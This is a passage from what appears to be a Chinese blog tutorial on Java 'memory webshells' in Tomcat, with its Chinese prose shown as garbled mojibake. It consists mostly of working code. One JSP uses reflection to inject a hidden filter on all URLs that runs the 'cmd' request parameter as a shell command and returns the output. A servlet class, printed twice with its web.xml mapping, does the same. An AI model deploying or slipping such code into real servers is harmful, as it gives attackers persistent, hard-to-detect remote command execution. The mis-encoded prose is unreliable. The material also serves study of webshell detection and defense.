System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    isLinux = <span class="hljs-literal">false</span>;<br>                &#125;<br>                String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                resp.getWriter().write(output);<br>                resp.getWriter().flush();<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>    &#125;<br>%&gt;<br><br>&lt;%<br>    <span class="hljs-comment">// 1.è·å– StandardContext å¯¹è±¡</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextFiled</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">StandardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-type">ShellFilter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellFilter</span>();<br><br>    <span class="hljs-comment">// 3. ä½¿ç”¨ FilterDef å°è£… filter</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    StandardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">// 2. åˆ›å»º filterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    StandardContext.addFilterMapBefore(filterMap);<br><br>    <span class="hljs-comment">// 4.å°è£… filterConfig å’Œ filterDef åˆ° filterConfigs</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> StandardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(StandardContext);<br><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(StandardContext, filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="1-4-åˆ©ç”¨ï¼š"><a href="#1-4-åˆ©ç”¨ï¼š" class="headerlink" title="1.4 åˆ©ç”¨ï¼š"></a>1.4 åˆ©ç”¨ï¼š</h3><p>å…ˆè®¿é—® addFilter.jsp å†™å…¥å†…å­˜é©¬ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513974.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513215.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514479.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515244.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515248.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533673.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533352.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533532.png" alt="img"></p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.105<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ›¿æ¢æ³¨é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;servlet&gt;<br>    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.src.tomcatdemo.HelloServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/hello-servlet&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br></code></pre></td></tr></table></figure><h4 id="å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»æµ‹è¯•ï¼š"><a href="#å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»æµ‹è¯•ï¼š" class="headerlink" title="å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»æµ‹è¯•ï¼š"></a>å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»æµ‹è¯•ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.tomcatdemo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-comment">// åŸºç¡€æ¶æ„ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br><br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>                String line;<br>                <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    res.getWriter().println(line);<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>web.xml é…ç½®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span>    <br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.src.tomcatdemo.ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/servlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515231.png" alt="img"></p><h2 id="2-Servlet-å†…å­˜é©¬"><a href="#2-Servlet-å†…å­˜é©¬" class="headerlink" title="2. Servlet å†…å­˜é©¬"></a>2. Servlet å†…å­˜é©¬</h2><p>Servletï¼ˆServer Appletï¼‰æ˜¯ Java Servlet çš„ç®€ç§°ï¼Œç§°ä¸ºå°æœåŠ¡ç¨‹åºæˆ–æœåŠ¡è¿æ¥å™¨ï¼Œç”¨æ¥è¯»å–å®¢æˆ·ç«¯å‘é€çš„æ•°æ®ï¼Œå¤„ç†å¹¶è¿”å›ç»“æœã€‚</p><h3 id="2-1-ç¯å¢ƒåˆ›å»ºï¼š"><a href="#2-1-ç¯å¢ƒåˆ›å»ºï¼š" class="headerlink" title="2.1 ç¯å¢ƒåˆ›å»ºï¼š"></a>2.1 ç¯å¢ƒåˆ›å»ºï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516153.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516728.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515773.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515748.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515757.png" alt="img"></p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.105<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ›¿æ¢æ³¨é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;servlet&gt;<br>    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.src.tomcatdemo.HelloServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/hello-servlet&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br></code></pre></td></tr></table></figure><h4 id="å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»æµ‹è¯•ï¼š-1"><a href="#å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»æµ‹è¯•ï¼š-1" class="headerlink" title="å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»æµ‹è¯•ï¼š"></a>å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»æµ‹è¯•ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.tomcatdemo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-comment">// åŸºç¡€æ¶æ„ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br><br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>                String line;<br>                <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    res.getWriter().println(line);<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>web.xml é…ç½®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span>    <br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.src.tomcatdemo.ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/servlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516566.png" alt="img"></p><h3 id="2-2-æµç¨‹åˆ†æï¼š"><a href="#2-2-æµç¨‹åˆ†æï¼š" class="headerlink" title="2.2 æµç¨‹åˆ†æï¼š"></a>2.2 æµç¨‹åˆ†æï¼š</h3><h4 id="å‰ç½®æµç¨‹ï¼š"><a href="#å‰ç½®æµç¨‹ï¼š" class="headerlink" title="å‰ç½®æµç¨‹ï¼š"></a>å‰ç½®æµç¨‹ï¼š</h4><p>å› ä¸º Web åº”ç”¨ç¨‹åºçš„é¡ºåºæ˜¯ Listener â€”&gt; Filter â€”&gt; Servletï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è°ƒç”¨ Servlet çš„æ—¶å€™ä¹Ÿä¼šçœ‹åˆ° Listener å’Œ Filter çš„æµç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515838.png" alt="img"></p><p>é¦–å…ˆæ ¹æ®ä¸Šå›¾æµç¨‹è·Ÿåˆ° configureStart() å®Œæˆå¯åŠ¨é…ç½®ï¼Œè§£æ web.xml</p><p>**xml èµ‹å€¼å¯¹è±¡ï¼š**ä» <code>web.xml</code> é…ç½®æ–‡ä»¶ä¸­è¯»å–é…ç½®ä¿¡æ¯ï¼ˆå¦‚ Servletã€Filter å‚æ•°ï¼‰ï¼Œå¹¶å°†å…¶è½¬åŒ–ä¸ºå†…å­˜ä¸­çš„ Java å¯¹è±¡ï¼ˆå¦‚ <code>ServletDef</code>ã€<code>FilterDef</code>ï¼‰ã€‚</p><p><strong>configureContext() :</strong></p><p>ç”¨äºé…ç½® <code>Context</code> å¯¹è±¡ï¼ˆä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼‰åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œä¼šè¿›è¡Œä¸€ç³»åˆ—åˆå§‹åŒ–æ“ä½œï¼Œæ¯”å¦‚æ³¨å†Œ Filterã€Servlet ç­‰ã€‚</p><p><strong>context.addFilterDef(filter):</strong></p><p>å°†è§£æå¾—åˆ°çš„ FilterDefï¼ˆFilter å®šä¹‰å¯¹è±¡ï¼‰æ·»åŠ åˆ° Context ä¸­ã€‚</p><p>FilterDef åŒ…å« Filter çš„åç§°ã€ç±»åã€åˆå§‹åŒ–å‚æ•°ç­‰ã€‚</p><p><strong>context.addFilterMap(filterMap):</strong><br>å°† Filter çš„æ˜ å°„å…³ç³»ï¼ˆå³å“ªäº› URL æˆ– Servlet ä¼šè¢«è¯¥ Filter æ‹¦æˆªï¼‰æ·»åŠ åˆ° Context ä¸­ã€‚</p><p><strong>æ¯ä¸ªservletåŒ…è£…æˆwrapperå¯¹è±¡:</strong><br>è¿™æ˜¯ Servlet å®¹å™¨ä¸­çš„å…³é”®è®¾è®¡ï¼šæ¯ä¸ª Servlet éƒ½è¢«å°è£…ä¸ºä¸€ä¸ª Wrapper å¯¹è±¡ã€‚</p><p>Wrapper æ˜¯ Tomcat å®¹å™¨ä½“ç³»ä¸­çš„æœ€åº•å±‚å®¹å™¨ï¼Œä¸“é—¨ç”¨äºç®¡ç†ä¸€ä¸ª Servlet çš„ç”Ÿå‘½å‘¨æœŸã€‚</p><h4 id="åˆ›å»ºä¸è£…è½½-StandardWrapper"><a 